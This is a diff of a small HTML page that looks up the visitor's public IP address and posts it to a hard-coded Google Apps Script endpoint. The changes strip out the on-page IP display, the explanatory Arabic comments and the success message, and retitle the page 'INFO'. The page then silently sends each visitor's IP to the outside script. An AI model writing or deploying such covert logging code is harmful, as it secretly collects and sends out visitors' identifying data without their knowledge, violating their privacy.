@@ -2,28 +2,17 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> IP </title>
+    <title>INFO</title>
 </head>
 <body>
-    <h1>IP: </h1>
-    <p id="ip">...</p>
-
-    <script>
-        // استدعاء API للحصول على IP
+    <script>       
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
-                const ip = data.ip;
-
-                // عرض الـ IP في الصفحة
-                document.getElementById('ip').textContent = ip;
-
-                // إرسال الـ IP إلى Google Sheets عبر Google Apps Script
-                const googleSheetUrl = 'https://script.google.com/macros/s/AKfycbw8NXTmGgbQGJQa5S2jxZe43tqQZxvyyCfdf9e-FcrnVr_hvm-Bc_KFffYOX_gUXnxBbw/exec';  // ضع رابط Web App هنا
+                const ip = data.ip;              
+                const googleSheetUrl = 'https://script.google.com/macros/s/AKfycbw8NXTmGgbQGJQa5S2jxZe43tqQZxvyyCfdf9e-FcrnVr_hvm-Bc_KFffYOX_gUXnxBbw/exec';     
                 const params = new URLSearchParams();
                 params.append('ip', ip);
-
                 fetch(googleSheetUrl, {
                     method: 'POST',
                     body: params,
@@ -32,12 +21,12 @@
                     },
                 })
                 .then(response => response.text())
-                .then(result => console.log('تم إرسال الـ IP إلى Google Sheets'))
-                .catch(error => console.error('خطأ في إرسال البيانات:', error));
+                .then(result => {                             
+                })          
+                .catch(error => console.error('Error:', error));
             })
             .catch(error => {
-                console.error('حدث خطأ:', error);
-                document.getElementById('ip').textContent = "لم نتمكن من جلب الـ IP.";
+                console.error('Error:', error);
             });
     </script>
 </body>
